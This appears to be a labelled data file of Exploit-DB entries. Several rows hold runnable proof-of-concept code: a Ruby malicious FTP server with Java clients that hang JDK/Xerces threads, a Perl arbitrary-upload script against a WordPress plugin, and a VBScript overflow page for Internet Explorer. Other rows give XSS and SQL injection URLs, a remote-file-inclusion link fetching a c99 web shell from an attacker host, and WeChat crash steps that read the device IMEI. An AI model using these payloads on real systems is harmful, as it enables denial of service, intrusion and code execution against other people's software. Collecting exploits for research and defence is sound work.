44057,"Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server Side Denial of Service ## Vulnerabilities Summary The following advisory describes two (2) vulnerabilities found in Oracle Java JDK/JRE (1.8.0.131 and previous versions) packages and Apache Xerces (2.11.0)  The vulnerabilities are:  Oracle JDK/JRE Concurrency-Related Denial of Service java.net.URLConnection (with no setConnectTimeout) Concurrency-Related Denial of Service  ## Credit An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program  ## Vendor response Update 1: Oracle has released patches to address this vulnerability and assigned CVE-2017-10355  Oracle acknowledged receiving the report, and has assigned it a tracking number: S0876966. We have no further information on patch availability or a workaround.  ## Vulnerabilities Details These two vulnerabilities can be triggered to cause a Denial of Service against a server, under the following conditions:  An attacker can pass an URL parameter that points to a controlled FTP server to the target Target server uses vulnerable component(s) to fetch the resource specified by the attacker Target server does not prevent fetching of FTP URI resources In both vulnerabilities, the attack sequence is the following:  Attacker forces vulnerable target server to parse an FTP URL which points to an attacker’s controlled FTP server Target server fetches FTP resource provided by attacker Attacker’s FTP server abruptly exits, leaving the Java process on target server with two internal threads in an infinite waiting status If the Java process is single-threaded, then it cannot further process any other client requests, reaching a Denial of Service condition with only one request from the attacker In case of a multi-threading process, then it is possible to use the same technique and reach a Denial of Service condition of all available threads, by issuing one request for each available thread The attacker’s controlled FTP server has to “abruptly” exit when the Java client will perform a RETR FTP command. This behavior is not properly handled and causes a thread concurrency Denial of Service.  For example:   require 'socket'  ftp_server = TCPServer.new 21  Thread.start do loop do  Thread.start(ftp_server.accept) do |ftp_client|     puts ""FTP. New client connected""     ftp_client.puts(""220 ftp-server"")     counter = 0     loop {         req = ftp_client.gets()         break if req.nil?         puts ""< ""+req                  if req.include? ""USER""             ftp_client.puts(""331 password"")         else             ftp_client.puts(""230 Waiting data"")             counter = counter + 1             if counter == 6                 abort             end         end     }     puts ""Aborted...""   end end end  loop do      sleep(50000) end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 require 'socket'   ftp_server = TCPServer.new 21   Thread.start do loop do  Thread.start(ftp_server.accept) do |ftp_client|     puts ""FTP. New client connected""     ftp_client.puts(""220 ftp-server"")     counter = 0     loop {         req = ftp_client.gets()         break if req.nil?         puts ""< ""+req                  if req.include? ""USER""             ftp_client.puts(""331 password"")         else             ftp_client.puts(""230 Waiting data"")             counter = counter + 1             if counter == 6                 abort             end         end     }     puts ""Aborted...""   end end end   loop do      sleep(50000) end   When triggered, the DoS will result in a CLOSE_WAIT status on the connection between the target server and the FTP server (192.168.234.134), leaving the Java process thread stuck.    Oracle JDK/JRE Concurrency-Related Denial of Service The vulnerable functions are:  java.io.InputStream java.xml.ws.Service javax.xml.validation.Schema javax.xml.JAXBContext java.net.JarURLConnection – The setConnectionTimeout and setReadTimeout are ignored javax.imageio.ImageIO Javax.swing.ImageIcon javax.swing.text.html.StyleSheet   ## java.io.InputStream Proof of Concept  ``` import java.io.InputStream; import java.net.URL;  public class RandomAccess {  public static void main(String[] args) {   try {    //url = new URL (""ftp://maliciousftp:2121/test.xml"");    URL url = new URL(""ftp://maliciousftp:2121/test.xml"");    InputStream inputStream = url.openStream();    inputStream.read();    //urlc.setReadTimeout(5000);    //urlc.setConnectTimeout(5000); // <- this fixes the bug   } catch (Exception e) {    e.printStackTrace();   }  } } ```  ## javax.xml.ws.Service Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.namespace.QName; import javax.xml.ws.Service;  public class CreateService {  public static void main(String[] args) {   String wsdlURL = ""ftp://maliciousftp:2121/test?wsdl"";   String namespace = ""http://foo.bar.com/webservice"";   String serviceName = ""SomeService"";   QName serviceQN = new QName(namespace, serviceName);    try {    Service service = Service.create(new URL(wsdlURL), serviceQN);   } catch (MalformedURLException e) {    e.printStackTrace();   }  }  } ```  ## javax.xml.validation.Schema Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.validation.Schema; import javax.xml.validation.SchemaFactory;  import org.xml.sax.SAXException;  public class NSchema {  public static void main(String[] args) {   SchemaFactory schemaFactory =   SchemaFactory.newInstance(""http://www.w3.org/2001/XMLSchema"");   URL url;   try {    url = new URL(""ftp://maliciousftp:2121/schema"");    try {     Schema schemaGrammar = schemaFactory.newSchema(url);    } catch (SAXException e) {     e.printStackTrace();    }   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## javax.xml.JAXBContext Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBException; import javax.xml.bind.Unmarshaller;  public class UnMarsh {  public static void main(String[] args) {   JAXBContext jaxbContext = null;   try {    jaxbContext = JAXBContext.newInstance();   } catch (JAXBException e) {    e.printStackTrace();   }   URL url = null;   try {    url = new URL(""ftp://maliciousftp:2121/test"");   } catch (MalformedURLException e) {    e.printStackTrace();   }   Unmarshaller jaxbUnmarshaller = null;   try {    jaxbUnmarshaller = jaxbContext.createUnmarshaller();   } catch (JAXBException e) {    e.printStackTrace();   }   try {    Object test = jaxbUnmarshaller.unmarshal(url);   } catch (JAXBException e) {    e.printStackTrace();   }  } } ```  ## java.net.JarURLConnection Proof of Concept  ``` import java.io.IOException; import java.net.JarURLConnection; import java.net.MalformedURLException; import java.net.URL; import java.util.jar.Manifest;  public class JavaUrl {   public static void main(String[] args) {   URL url = null;   try {    url = new URL(""jar:ftp://maliciousftp:2121/duke.jar!/"");   } catch (MalformedURLException e) {    e.printStackTrace();   }   JarURLConnection jarConnection = null;   try {    jarConnection = (JarURLConnection) url.openConnection();    jarConnection.setConnectTimeout(5000);    jarConnection.setReadTimeout(5000);    } catch (IOException e1) {    e1.printStackTrace();   }   try {    Manifest manifest = jarConnection.getManifest();   } catch (IOException e) {    e.printStackTrace();   }  } } ```  ## javax.imageio.ImageIO Proof of Concept  ``` import java.awt.Image; import java.io.IOException; import java.net.URL; import javax.imageio.ImageIO; import javax.swing.ImageIcon; import javax.swing.JFrame; import javax.swing.JLabel;  public class ImageReader {  public static void main(String[] args) {   Image image = null;   try {    URL url = new URL(""ftp://maliciousftp:2121/test.jpg"");    image = ImageIO.read(url);   } catch (IOException e) {    e.printStackTrace();   }    JFrame frame = new JFrame();   frame.setSize(300, 300);   JLabel label = new JLabel(new ImageIcon(image));   frame.add(label);   frame.setVisible(true);  } } ```  ## javax.swing.ImageIcon Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL; import javax.swing.ImageIcon;  public class ImageXcon {  public static void main(String[] args) {   URL imgURL;   try {    imgURL = new URL(""ftp://maliciousftp:2121/test"");    String description = """";    ImageIcon icon = new ImageIcon(imgURL, description);   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## javax.swing.text.html.StyleSheet Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.swing.text.html.StyleSheet;  public class ImportStyla {   public static void main(String[] args) {   StyleSheet cs = new StyleSheet();   URL url;   try {    url = new URL(""ftp://maliciousftp:2121/test"");    cs.importStyleSheet(url);   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## java.net.URLConnection – Concurrency-Related Denial of Service A Thread Concurrency Denial of Service condition exists when java.net.URLConnection is used to fetch a file from an FTP server without specifying a Connection Timeout value.  The vulnerable functions are:  javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory org.dom4j.Document org.dom4j.io.SAXReader javax.xml.parsers.DocumentBuilder javax.xml.parsers.DocumentBuilderFactory The Root Cause Issue in Apache Xerces is the com.sun.org.apache.xerces.internal.impl.XMLEntityManager.class    In this case, XMLEntityManager.class does not explicitly set Connection Timeout for the connect object, letting Java to set a default value of -1, leading to a Denial of Service condition, as explained below.  Example of code using Apache Xerces library to fetch an XML file from an FTP server:  ``` [snip]     private void parseXmlFile() {      //get the factory      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();      try {       //Using factory get an instance of document builder       DocumentBuilder db = dbf.newDocumentBuilder();       //parse using builder to get DOM representation of the XML file       dom = db.parse(""ftp://maliciousftpserver/test.xml""); & lt; - FTP URL controlled by the attacker      } catch (ParserConfigurationException pce) {       pce.printStackTrace();      } catch (SAXException se) {       se.printStackTrace();      } catch (IOException ioe) {       ioe.printStackTrace();      }     } [snip] ```  ## SAXParser Proof of Concept  ``` SAXParserFactory factory = SAXParserFactory.newInstance(); SAXParser saxParser = factory.newSAXParser(); UserHandler userhandler = new UserHandler(); saxParser.parse(""ftp://badftpserver:2121/whatever.xml”) ```  ## DOM4J / SAXReader Proof of Concept  ``` SAXReader reader = new SAXReader(); Document document = reader.read( ""ftp://badftpserver:2121/whatever.xml"" ); ```  ## JAVAX XML Parsers Proof of Concept  ``` DocumentBuilder db = dbf.newDocumentBuilder();           dom = db.parse(""ftp://badftpserver:2121/whatever.xml""); ```","[""'PDF/Docx'""]",1
9496,"War-FTPD 1.65 - MKD/CD Requests Denial of Service WAR-FTPD 1.65 (MKD & CD) requests Remote Denial of Service exploited by opt!x hacker mail: optix@9.cn greetz to his0k4 about : http://securityreason.com/exploitalert/6971 you have to connect to target server from cmd like that: i sended it with perl and python scripts but it's not working because im beginner in remotes ############################################################ Microsoft Windows XP [version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp.  C:\Documents and Settings\Administrateur>ftp ftp> open Vers 5.237.109.181 21 ConnectÃ© Ã  5.237.109.181. 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready 220 Please enter your user name. Utilisateur (5.237.109.181:(none)) : root 331 User name okay, Need password. Mot de passe : 230 User logged in, proceed. ftp> MKD A x 5000 or cd A x 5000 ##########################################################  you have to execute this perl script then put his content after MKD or CD __________________________________________________________________ my $crash= ""A"" x 5000; open(c,"">>denial.txt""); print c $crash; print ""[+] Done !! [+]""; close(c); _________________________________________________________________  then olly is executed because im working with this option : just in time debugger  ########################################################################### #################"""""" EAX 41414141 ECX 008EEC18 ASCII ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAA EDX 008E0278 EBX 008E0000 ESP 00B2F538 EBP 00B2F758 ESI 008EEC10 ASCII ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAA EDI 41414141 EIP 7C9211DE ntdll.7C9211DE ########################################################################### ##################""""""  and programm will be crashed :)   # milw0rm.com [2009-08-24]",['MKD/CD'],1
20505,"Secure Computing e.iD Authenticator for Palm 2.0 - PIN Brute Force source: https://www.securityfocus.com/bid/2105/info  Summary:  An attacker that obtains access to the ""sceiddb.pdb"" file, part of Secure Computing's e.iD Authenticator for Palm, can determine the user's PIN.  Problem Description:  Secure Computing's SafeWord is a system of authentication services that supports among other authentication methods one-time password. The one-time passwords are generated by the authenticating user via a hardware or software token device from the users PIN number and a Token Key stored in the device. During authentication, a user-generated one-time password, or tokencode, is sent to the authentication server and the user is authenticated if the tokencode was generated from a valid PIN and Token Key. In this sort of authentication system, the security of the shard secret (the user's PIN) is critical.  Secure Computing's e.iD Authenticator for Palm is a software token device for the SafeWord system that runs on the Palm Pilot. e.iD Authenticator for Palm uses a palm database (PDB) file called ""sceiddb.pdb"" containing an encrypted version of the user's PIN as well as the Token Key.  The encrypted version of the user's PIN is used when the user attempts to change his PIN. Before the PIN can be changed the user must enter their current PIN. The entered PIN is encrypted and compared to the encrypted PIN. If they don't match the device will display a warning and refuse to change the PIN.  PINs are from 2 to 8 digits in length. The encrypted PIN is always 16 bytes. The encrypted PIN is found starting at address 0x7A to address 0x89 in the ""sceiddb.pdb"" file.  As Palm Pilot and related devices are considered general purpose platforms and are not tamper-resistant devices there exist likely scenarios in which an attacker may obtain access to the ""sceiddb.pdb"" file.  An attacker with access to the ""sceiddb.pdb"" file can obtain the user's PIN by encrypting every possible 8 digit PINs and comparing them with the encrypted PIN in the ""sceiddb.pdb"" file. > @Stake has calculated the time required to obtain different length PIN numbers using a Pentium III 450MHz:  PIN Length Time to calculate PIN  2 0.023 seconds 3 0.23 seconds 4 2.3 seconds 5 23.3 seconds 6 3.8 minutes 7 38.8 minutes 8 6.48 hours  Once a user's PIN has been obtained an attacker can generate a valid tokencode if he can determine the most recent tokencode used by the user to authenticate to the SafeWord system.  Scenarios:  The are a number of likely scenarios that can allow an attacker to obtain access to the ""sceiddb.pdb"" file.  * If an attacker obtains access to the user's Palm device he can copy via IrDA (infrared), or ""beam"", the ""sceiddb.pdb"" file. By default this file does not have the ""Beam Lock"" protection bit set. This bit tells the PalmOS not to allow the beaming of the file. But the ""Beam Lock"" protection can be easily disabled.  * If an attacker obtains access to a computer the user uses to HotSync or backup his Palm device the attacker may find a copy of the ""sceiddb.pdb"" file. By default this file is configured not to be backed up. However, some third party utilities may ignore this and back it up, the user may have configured the file to be backed up, or the file may be pending download into the Palm device.  The are also a number of likely scenarios that can allow an attacker to obtain the most recent tokencode used by the user to authenticate to the SafeWord system:  * The attacker may monitor the network and extract the tokencode from non-encrypted authentication requests (e.g. telnet).  * The attacker may obtain access to the machine the user is entering the tokencode in and read the keyboard output.  * The attacker may view the tokencode as it is being physically entered by the user (""shoulder surfing"").   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20505.zip",['PINs'],1
46853,"WeChat for Android 7.0.4 - 'vcodec2_hls_filter' Denial of Service # Exploit Title: DoS Wechat with an emoji # Date: 16-May-2019 # Exploit Author: Hong Nhat Pham # Vendor Homepage: http://www.tencent.com/en-us/index.html # Software Link: https://play.google.com/store/apps/details?id=com.tencent.mm # Version: 7.0.4 # Tested on: Android 9.0 # CVE : CVE-2019-11419  Description: vcodec2_hls_filter in libvoipCodec_v7a.so in WeChat application for Android results in a DoS by replacing an emoji file (under the /sdcard/tencent/MicroMsg directory) with a crafted .wxgf file. Crash-log is provided in poc.zip file at https://drive.google.com/open?id=1HFQtbD10awuUicdWoq3dKVKfv0wvxOKS  Vulnerability Type: Denial of Service  Vendor of Product: Tencent  Affected Product Code Base: WeChat for Android - Up to latest version (7.0.4)  Affected Component: Function vcodec2_hls_filter in libvoipCodec_v7a.so  Attack Type: Local  Attack vector: An malware app can crafts a malicious emoji file and overwrites the emoji files under /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID]. Once the user opens any chat messages that contain an emoji, WeChat will instantly crash.  POC: Video at https://drive.google.com/open?id=1x1Z3hm4j8f4rhv_WUp4gW-bhdtZMezdU  User must have sent or received a GIF file in WeChat Malware app must retrieve the phone’s IMEI. For POC, we can use the below command adb shell service call iphonesubinfo 1 | awk -F ""'"" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=- Produce the malicious emoji file with the retrieved IMEI (use encrypt_wxgf.py in poc.zip): python encrypt.py crash4.wxgf [SIZE_OF_EMOJI_ON_SDCARD] Replace /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID] with the padded out.wxgf.encrypted WeChat will crash now if a message that contains the overwritten emoji file   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46853.zip","[""'vcodec2_hls_filter'""]",1
29283,"GenesisTrader 1.0 - 'form.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/21595/info   GenesisTrader is prone to multiple input-validation vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues include multiple information-disclosure vulnerabilities, an arbitrary file-upload vulnerability, and multiple cross-site scripting vulnerabilities.   An attacker can exploit these issues to upload and execute malicious PHP code in the context of the webserver process, to view sensitive information, and to steal cookie-based authentication credentials. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible. Exploiting these issues may aid the attacker in further attacks.   Version 1.0 is vulnerable to these issues; other versions may also be affected.  http://www.example.com/index.php?cuve=[XSS] http://www.example.com/form.php?floap=ajoutfich&cuve=[XSS] http://www.example.com/form.php?floap=modfich&chem=[XSS] http://www.example.com/form.php?floap=modfich&do=[XSS] http://www.example.com/form.php?floap=rename&chem=[XSS] http://www.example.com/form.php?floap=rename&do=[XSS] http://www.example.com/form.php?floap=copy&chem=[XSS] http://www.example.com/form.php?floap=copy&do=[XSS] http://www.example.com/form.php?floap=chmod&chem=[XSS] http://www.example.com/form.php?floap=chmod&do=[XSS]","[""'form.php'""]",1
38585,"WordPress Plugin NextGEN Gallery - 'upload.php' Arbitrary File Upload source: https://www.securityfocus.com/bid/60533/info  The NextGEN Gallery plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.  An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.  NextGEN Gallery 1.9.12 is vulnerable; other versions may also be affected.   #! /usr/bin/perl  use LWP;  use HTTP::Request::Common;   my ($url, $file) = @ARGV;   my $ua = LWP::UserAgent->new();  my $req = POST $url,  Content_Type => 'form-data',  Content => [.  name => $name,  galleryselect => 1, # Gallery ID, should exist  Filedata => [ ""$file"", ""file.gif"", Content_Type =>  'image/gif' ]  ];  my $res = $ua->request( $req );  if( $res->is_success ) {  print $res->content;  } else {  print $res->status_line, ""\n"";  }","[""'upload.php'""]",1
8786,"Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure Severe vulnerability due to a bug in FreeBSD, OS X and Solaris (<10) filesystems affecting Lighttpd (<1.4.23)  A bug was discovered in the way FreeBSD, OS X and Solaris (prior version 10) handle symlinks appended with a slash (/). Accessing a regular file through a symbolic link with appended slash succeeds because the slash apperently gets silently dropped. On systems that do not expose this behaviour, a call to stat(""symlink.php/"") or open(""symlink.php/"") to a symlink pointing to example.php, will not succeed and set errno to ENOTDIR. This is not the case on the systems mentioned.  The vulnerability arises when an application filters access to or decides how to handle a file based on a suffix match. An attacker could circumvent normal behaviour by appended a slash to the filename, resulting in said access rules not applying.   Lighttpd in versions prior to 1.4.23 was not aware of this bug and therefor can be tricked by an attacker. It decides how to process a request based on suffix rules provided in its config, usually matching ""^.*\.php$"". The attacker can bypass this rule and gain access to the sourcecode of the .php file possibly revealing sensitive information like passwords.  Other applications, not only webservers, are probably vulnerable due to this flaw as well.  The bug has been known since at least the year 2000 but has remained unfixed to this day: http://www.freebsd.org/cgi/query-pr.cgi?pr=kern/21768  Lighttpd 1.4.23 will include a workaround for said problem to prevent attacks. Bug report: http://redmine.lighttpd.net/issues/1989  Description  If you put a trailing slash / after the .php and that file is a link, it will just display the content of the file.  2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (response.c.391) -- before doc_root 2009-05-22 13:40:37: (response.c.392) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.393) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.394) Path : 2009-05-22 13:40:37: (response.c.442) -- after doc_root 2009-05-22 13:40:37: (response.c.443) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.444) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.445) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.462) -- logical -> physical 2009-05-22 13:40:37: (response.c.463) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.464) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.465) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.482) -- handling physical path 2009-05-22 13:40:37: (response.c.483) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.490) -- file found 2009-05-22 13:40:37: (response.c.491) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.640) -- handling subrequest 2009-05-22 13:40:37: (response.c.641) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (mod_indexfile.c.151) -- handling the request as Indexfile 2009-05-22 13:40:37: (mod_indexfile.c.152) URI : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (mod_staticfile.c.394) -- handling file as static file 2009-05-22 13:40:37: (response.c.652) -- subrequest finished 2009-05-22 13:40:37: (response.c.121) Response-Header:  # milw0rm.com [2009-05-26]",['symlink.php/'],1
24989,"WordPress Core 1.2.1/1.2.2 - '/wp-admin/templates.php?file' Cross-Site Scripting source: https://www.securityfocus.com/bid/11984/info   Wordpress is reported vulnerable to multiple cross-site scripting, HTML injection, and SQL injection vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied data.   The cross-site scripting and HTML injection issues could permit a remote attacker to create a malicious URI link, or post data to the affected application that includes hostile HTML and script code. If this link were to be followed, or resulting pages were to be viewed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.   An attacker may exploit the SQL injection issues to manipulate SQL queries to the underlying database. This may facilitate theft of sensitive information, potentially including authentication credentials, and data corruption.  http://www.example.com/wp-admin/templates.php?file=[XSS]","[""'/wp-admin/templates.php?file'""]",1
28025,RahnemaCo - 'page.php' Remote File Inclusion source: https://www.securityfocus.com/bid/18435/info  RahnemaCo is prone to a remote file-include vulnerability.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/shop/page.php?osCsid=http://yoursite/c99shell.txt?,"[""'page.php'""]",1
41286,"SOA School Management - 'view' SQL Injection # # # # #  # Exploit Title: Complete School Management Software with Web Portal - SQL Injection # Google Dork: N/A # Date: 09.02.2017 # Vendor Homepage: http://www.ynetinteractive.com/ # Software Buy: http://www.ynetinteractive.com/soa/ # Demo: http://www.ynetinteractive.com/soa/demo.php # Version: N/A # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # Login as student user # Other user groups have vulnerabilities. # http://localhost/[PATH]/Document.php?view=[SQL] # Etc... # # # # #","[""'view'""]",1
4251,"Microsoft Internet Explorer 6 - DirectX Media Remote Overflow Denial of Service <!--============================================================================ dxtmsft.dll Remote Buffer Overflow Exploit Internet Explorer ver 6.0 DeltahackingSecurityTEAM Bug discovered by Dr.Pantagon Affected Software: dxtmsft.dll  (DirectX Media -- Image DirectX Transforms) DLL VER : 6.00.2900.2180 (xpsp_sp2_rtm.040803-2158) Company Dll : Microsoft® Windows® Operating System path : C:\WINDOWS\system32\dxtmsft.dll all software that use this ocx are vulnerable to this exploits. www.Deltahacking.net www.Deltasecurity.ir ==============================================================================-->  <object classid=""clsid:421516C1-3CF8-11D2-952A-00C04FA34F05"" id=""Chroma""></object>  <input language=VBScript onclick=jojo() type=button value=""Click here to start Exploit""><script language='vbscript'>  Sub jojo   buff = String(999999, ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaA"")    get_EDX = ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbcccccccccccccddddddddddeee""    buff1 = String(999999, ""BBBBBBBBBBBBBBBBBBBBBBBBBBBBbb"")    egg = buff + get_EDX + buff1 + scode    Chroma.Color = egg  End Sub </script>  # milw0rm.com [2007-07-31]",['DirectX Media'],1
